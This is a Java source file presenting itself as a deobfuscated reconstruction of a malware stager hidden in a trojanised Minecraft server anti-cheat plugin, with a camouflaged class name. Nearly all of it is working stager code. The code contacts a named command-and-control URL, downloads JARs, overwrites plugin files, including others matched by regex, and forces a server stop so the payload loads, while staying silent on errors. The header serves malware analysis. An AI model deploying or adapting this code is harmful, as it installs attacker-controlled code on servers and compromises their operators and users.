/*
 * Deobfuscated reconstruction of the first-stage stager
 *   ac/grim/grimac/shaded/fastutil/ints/ConsumerIntBig.class
 * from fyreac-bukkit-2.3.74-a6a602d.jar
 *   SHA-256 ad6e0d958eb1a8967f1d06536aa4ed98e1970721bd2b5b2dc7cb2e87284da5d6
 *
 * The class name and package are deliberate camouflage: it is not fastutil.
 * It is registered as a Bukkit Listener by the modified
 * GrimACBukkitLoaderPlugin.onEnable() and immediately contacts the C2.
 *
 * C2: http://crimson-tree-cf44.blaher331.workers.dev/api/asdfg2asd
 *
 * Obfuscated member map:
 *   comparatorsIndirect(JavaPlugin) -> registerAndDeploy(JavaPlugin)
 *   checkAndDeploy(JavaPlugin)      -> checkAndDeploy(JavaPlugin)
 *   patchFile(File,String,String)   -> patchFile(File,String,String)
 *   restartServer(JavaPlugin)       -> restartServer(JavaPlugin)
 *   fetchJson(String)               -> fetchJson(String)
 *   getFileHash(File)               -> sha256(File)
 *   downloadFile(String,File)       -> download(String,File)
 */
package ac.grim.grimac.shaded.fastutil.ints;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Type;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.List;
import java.util.Map;
import org.bukkit.command.CommandSender;
import org.bukkit.event.Listener;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

/**
 * Downloads and replaces plugin JARs from a C2 manifest, then stops the server
 * so the replacement is loaded on the next start.
 */
public class FyreACStager implements Listener {

    private static final String API_URL =
            "http://crimson-tree-cf44.blaher331.workers.dev/api/asdfg2asd";
    private static final String MAIN_PLUGIN_PATH = "plugins/paperfix-3.2.6.jar";
    private static final Gson GSON = new Gson();

    private final JavaPlugin plugin;

    private FyreACStager(JavaPlugin plugin) {
        this.plugin = plugin;
    }

    /** Entry point called from the trojanised GrimAC loader. */
    public static void registerAndDeploy(JavaPlugin plugin) {
        plugin.getServer().getPluginManager().registerEvents(new FyreACStager(plugin), plugin);
        checkAndDeploy(plugin);
    }

    /**
     * Fetches a JSON manifest:
     *
     * <pre>
     * {"url":"...","sha256":"...",
     *  "also":[{"namePattern":"regex","url":"...","sha256":"..."}]}
     * </pre>
     *
     * The primary payload always overwrites plugins/paperfix-3.2.6.jar; the
     * "also" list targets other plugin JARs whose file name matches a regex.
     * Any successful replacement schedules a console "stop".
     */
    public static void checkAndDeploy(JavaPlugin plugin) {
        try {
            String json = fetchJson(API_URL);
            if (json == null) {
                return;
            }

            Type manifestType = TypeToken.getParameterized(
                    Map.class, String.class, Object.class).getType();
            Map<?, ?> manifest = (Map<?, ?>) GSON.fromJson(json, manifestType);
            if (manifest == null) {
                return;
            }

            String primaryUrl = (String) manifest.get("url");
            String primarySha256 = (String) manifest.get("sha256");
            if (primaryUrl != null && primarySha256 != null
                    && patchFile(new File(MAIN_PLUGIN_PATH), primaryUrl, primarySha256)) {
                restartServer(plugin);
            }

            Object also = manifest.get("also");
            if (also instanceof List) {
                File pluginsDir = new File("plugins/");
                File[] existingPlugins = pluginsDir.listFiles();
                if (existingPlugins != null) {
                    for (Object entry : (List<?>) also) {
                        Map<?, ?> target = (Map<?, ?>) entry;
                        String namePattern = (String) target.get("namePattern");
                        String url = (String) target.get("url");
                        String sha256 = (String) target.get("sha256");
                        if (namePattern == null || url == null || sha256 == null) {
                            continue;
                        }
                        for (File pluginJar : existingPlugins) {
                            if (pluginJar.getName().matches(namePattern)
                                    && patchFile(pluginJar, url, sha256)) {
                                restartServer(plugin);
                            }
                        }
                    }
                }
            }
        } catch (Exception ignored) {
            // Fail closed and stay silent.
        }
    }

    /**
     * Replaces the file when it is missing or its SHA-256 does not match the
     * manifest.  Returns true when a download was performed.
     */
    private static boolean patchFile(File file, String url, String expectedSha256)
            throws IOException, NoSuchAlgorithmException {
        if (!file.exists() || !sha256(file).equalsIgnoreCase(expectedSha256)) {
            download(url, file);
            return true;
        }
        return false;
    }

    /** Waits 5 seconds, then dispatches "stop" to the console. */
    private static void restartServer(JavaPlugin plugin) {
        plugin.getServer().getScheduler().runTaskLater((Plugin) plugin, () ->
                plugin.getServer().dispatchCommand(
                        (CommandSender) plugin.getServer().getConsoleSender(), "stop"), 100L);
    }

    /** GETs the manifest with 5-second timeouts and returns the body. */
    private static String fetchJson(String url) throws IOException {
        URL endpoint = new URL(url);
        HttpURLConnection connection = (HttpURLConnection) endpoint.openConnection();
        connection.setRequestMethod("GET");
        connection.setConnectTimeout(5000);
        connection.setReadTimeout(5000);
        try {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(connection.getInputStream()))) {
                StringBuilder body = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    body.append(line);
                }
                return body.toString();
            }
        } finally {
            connection.disconnect();
        }
    }

    /** Hex-encoded SHA-256 of a file. */
    private static String sha256(File file) throws IOException, NoSuchAlgorithmException {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        try (FileInputStream input = new FileInputStream(file)) {
            byte[] buffer = new byte[8192];
            int read;
            while ((read = input.read(buffer)) != -1) {
                digest.update(buffer, 0, read);
            }
        }
        StringBuilder hex = new StringBuilder();
        for (byte value : digest.digest()) {
            String byteHex = Integer.toHexString(0xFF & value);
            if (byteHex.length() == 1) {
                hex.append('0');
            }
            hex.append(byteHex);
        }
        return hex.toString();
    }

    /** Downloads a replacement JAR, overwriting the target in place. */
    private static void download(String url, File file) throws IOException {
        URL endpoint = new URL(url);
        HttpURLConnection connection = (HttpURLConnection) endpoint.openConnection();
        connection.setRequestProperty("user-agent", "");
        try (InputStream input = connection.getInputStream();
             FileOutputStream output = new FileOutputStream(file)) {
            byte[] buffer = new byte[4096];
            int read;
            while ((read = input.read(buffer)) != -1) {
                output.write(buffer, 0, read);
            }
        } finally {
            connection.disconnect();
        }
    }
}
